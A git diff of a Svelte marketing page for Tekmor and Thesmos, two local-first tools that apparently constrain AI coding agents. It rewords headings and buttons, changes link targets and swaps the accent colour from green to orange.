-										>.verify/verify.toml</code
-									>.
+									Tekmor executes only allowlisted commands from <code class="text-neutral-200">.verify/verify.toml</code>.
+									The receipt binds to the exact git commit and tree SHA. Modifying any tracked source file immediately
+									invalidates earlier passes.
 								</p>
 							{/if}
 						</div>
@@ -542,15 +673,15 @@
 						<div
 							class="mt-6 pt-4 border-t border-white/[0.06] font-mono text-xs text-neutral-400 flex items-center justify-between"
 						>
-							<span>Deterministic local execution</span>
-							<span class="text-[#5fd39a]">0 model tokens spent</span>
+							<span>Local-first Apple Silicon execution</span>
+							<span class="text-[#ff7a4a]">0 model tokens spent on validation</span>
 						</div>
 					</div>
 				</div>
 			</div>
 		</section>
 
-		<!-- Empirical Benchmarks Section -->
+		<!-- Empirical Benchmarks Section (Properly numbered 02) -->
 		<BenchmarkMetrics />
 
 		<!-- Side-by-Side Product Chapters (01 & 02 Bento) -->
@@ -558,10 +689,10 @@
 			<div class="flex flex-col gap-2">
 				<span class="yc-label">03 <b>/</b> Execution Engine</span>
 				<h2 class="mt-2 text-3xl font-semibold tracking-tight text-white sm:text-4xl">
-					The Two Tools
+					Two Independent Local-First Engines
 				</h2>
 				<p class="text-sm text-neutral-400 max-w-xl">
-					Each tool runs independently on macOS Apple Silicon with zero external dependencies.
+					Each engine runs independently on macOS Apple Silicon with zero external dependencies.
 				</p>
 			</div>
 
@@ -660,11 +791,11 @@
 						</div>
 						<div class="mt-5 flex flex-wrap items-center justify-between gap-3">
 							<a
-								href="/tekmor/docs"
+								href="/tekmor"
 								class="yc-btn yc-btn-primary"
 								style="height: 38px; font-size: 12px;"
 							>
-								<span>Tekmor Documentation</span>
+								<span>Explore Tekmor</span>
 								<span class="yc-btn-icon" style="width: 22px; height: 22px;">
 									<ArrowRight size={11} />
 								</span>
@@ -760,11 +891,11 @@
 						</div>
 						<div class="mt-5 flex flex-wrap items-center justify-between gap-3">
 							<a
-								href="/thesmos/docs"
+								href="/thesmos"
 								class="yc-btn yc-btn-secondary"
 								style="height: 38px; font-size: 12px;"
 							>
-								<span>Thesmos Documentation</span>
+								<span>Explore Thesmos</span>
 								<span class="yc-btn-icon" style="width: 22px; height: 22px;">
 									<ArrowRight size={11} />
 								</span>
@@ -778,13 +909,13 @@
 
 		<!-- Comparison Matrix (Why Gates > Instructions) -->
 		<section id="comparison" class="yc-section yc-crosshair bg-[#050507]">
-			<span class="yc-label">04 <b>/</b> Architecture</span>
+			<span class="yc-label">04 <b>/</b> Comparison</span>
 			<h2 class="mt-2 text-3xl font-semibold tracking-tight text-white sm:text-4xl">
-				Instructions vs Hard Gates
+				Unrestricted Agents vs The Autonomic Governor
 			</h2>
 			<p class="mt-3 text-sm text-neutral-400 max-w-2xl">
 				System prompts ask agents to behave. Tekmor and Thesmos enforce deterministic boundaries at
-				the process level.
+				the process and filesystem level.
 			</p>
 
 			<!-- Mobile swipe indicator -->
@@ -806,8 +937,8 @@
 							<th class="px-5 py-3.5 sm:px-6 sm:py-4 font-normal text-neutral-500"
 								>Unrestricted Agent</th
 							>
-							<th class="px-5 py-3.5 sm:px-6 sm:py-4 font-normal text-[#5fd39a]"
-								>With Tekmor & Thesmos</th
+							<th class="px-5 py-3.5 sm:px-6 sm:py-4 font-normal text-[#ff7a4a]"
+								>With Thesmos & Tekmor</th
 							>
 						</tr>
 					</thead>
@@ -816,7 +947,7 @@
 							<tr class="transition-colors hover:bg-white/[0.02]">
 								<td class="px-5 py-4 sm:px-6 text-xs font-medium text-white">{item.metric}</td>
 								<td class="px-5 py-4 sm:px-6 text-xs text-neutral-400">{item.withoutTekmor}</td>
-								<td class="px-5 py-4 sm:px-6 text-xs font-medium text-[#5fd39a]"
+								<td class="px-5 py-4 sm:px-6 text-xs font-medium text-[#ff7a4a]"
 									>{item.withTekmor}</td
 								>
 							</tr>
@@ -833,7 +964,7 @@
 				Frequently asked questions
 			</h2>
 			<p class="mt-3 text-sm text-neutral-400">
-				Common questions about verification receipts, stop gates, and snapshots.
+				Common questions about deterministic DAGs, SQLite snapshots, and cryptographic tree receipts.
 			</p>
 
 			<div class="mt-10 divide-y divide-white/[0.08] border-y border-white/[0.08]">
@@ -844,7 +975,7 @@
 						>
 							<span>{faq.q}</span>
 							<span class="font-mono text-lg text-neutral-500 group-open:hidden">+</span>
-							<span class="hidden font-mono text-lg text-[#5fd39a] group-open:inline">&minus;</span>
+							<span class="hidden font-mono text-lg text-[#ff7a4a] group-open:inline">&minus;</span>
 						</summary>
 						<div class="mt-3 text-sm leading-relaxed text-neutral-400 pr-8">
 							{faq.a}
@@ -860,7 +991,7 @@
 			class="yc-section yc-crosshair bg-[#060608] text-center relative overflow-hidden"
 		>
 			<div
-				class="pointer-events-none absolute -top-24 left-1/2 -z-10 h-[300px] w-[600px] -translate-x-1/2 rounded-full bg-[radial-gradient(ellipse_at_center,rgba(95,211,154,0.15),transparent_70%)] blur-3xl"
+				class="pointer-events-none absolute -top-24 left-1/2 -z-10 h-[300px] w-[600px] -translate-x-1/2 rounded-full bg-[radial-gradient(ellipse_at_center,rgba(255,83,26,0.15),transparent_70%)] blur-3xl"
 			></div>
 
 			<span
@@ -873,22 +1004,22 @@
 			<h2
 				class="mx-auto mt-6 max-w-2xl text-3xl font-semibold tracking-tight text-white sm:text-4xl"
 			>
-				Allow one command. Read its receipt.
+				Deterministic Workflows. Cryptographic Proof.
 			</h2>
 			<p class="mx-auto mt-4 max-w-xl text-sm leading-relaxed text-neutral-400">
-				Start with the test command your team already trusts. Check the receipt for the current code
-				before you believe the claim.
+				Start with the test commands and workflow DAGs your team already trusts. Enforce deterministic
+				state transitions before accepting any autonomous change.
 			</p>
 
 			<div class="mt-9 flex flex-wrap justify-center gap-4">
-				<a href="/tekmor/docs" class="yc-btn yc-btn-primary">
-					<span>Install Tekmor</span>
+				<a href="/tekmor" class="yc-btn yc-btn-primary">
+					<span>Explore Tekmor</span>
 					<span class="yc-btn-icon">
 						<ArrowRight size={13} />
 					</span>
 				</a>
-				<a href="/thesmos/docs" class="yc-btn yc-btn-secondary">
-					<span>Install Thesmos</span>
+				<a href="/thesmos" class="yc-btn yc-btn-secondary">
+					<span>Explore Thesmos</span>
 					<span class="yc-btn-icon">
 						<ArrowRight size={13} />
 					</span>
